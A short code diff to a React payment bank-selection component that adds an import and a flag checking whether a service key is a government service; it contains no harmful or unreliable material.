@@ -8,6 +8,7 @@ import { designSystem } from "@/lib/designSystem";
 import { useToast } from "@/hooks/use-toast";
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
@@ -47,6 +48,9 @@ const PaymentBankSelector = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  
+  // Check if government service
+  const isGovService = isGovernmentService(serviceKey);
   
   const shippingInfo = linkData?.payload as any;
   const paymentData = shippingInfo?.payment_data;
